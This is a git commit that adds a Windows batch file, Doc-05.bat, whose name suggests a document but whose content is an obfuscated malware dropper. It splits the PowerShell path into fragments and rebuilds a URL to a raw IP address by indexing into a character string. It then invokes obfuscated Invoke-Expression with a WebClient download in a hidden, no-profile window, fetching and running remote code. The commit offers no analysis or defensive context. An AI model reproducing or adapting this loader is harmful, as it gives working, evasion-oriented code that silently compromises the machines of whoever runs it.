f958335a296040c83c992d7ff2ffeb276d9412b6
8C0305 <51167794+8C0305@users.noreply.github.com>
2019-05-29 12:03:30 -0300

    Add files via upload

---
+++ Doc-05.bat
@@ -0,0 +1,20 @@
+@echo off
+Set ah0r=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+cd %SystemRoot%\System32
+set a=Win
+set b=dow
+set c=sPo
+set d=wer
+set e=She
+set f=ll\
+set g=v1.
+set h=0\po
+set i=we
+set j=rsh
+set k=ell
+set l=.ex
+set m=e -n
+set n=op 
+set o=-w
+set p=in 1 -
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('%ah0r:~17,1%%ah0r:~29,1%%ah0r:~29,1%%ah0r:~25,1%://%ah0r:~5,1%%ah0r:~1,1%.%ah0r:~7,1%%ah0r:~5,1%.%ah0r:~2,1%%ah0r:~0,1%%ah0r:~5,1%.%ah0r:~2,1%%ah0r:~3,1%%ah0r:~6,1%/%ah0r:~21,1%%ah0r:~13,1%%ah0r:~28,1%%ah0r:~2,1%%ah0r:~5,1%/%ah0r:~25,1%%ah0r:~35,1%/%ah0r:~2,1%%ah0r:~0,1%%ah0r:~9,1%%ah0r:~3,1%%ah0r:~8,1%%ah0r:~0,1%%ah0r:~9,1%%ah0r:~2,1%%ah0r:~8,1%%ah0r:~3,1%%ah0r:~0,1%%ah0r:~4,1%%ah0r:~8,1%%ah0r:~2,1%')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
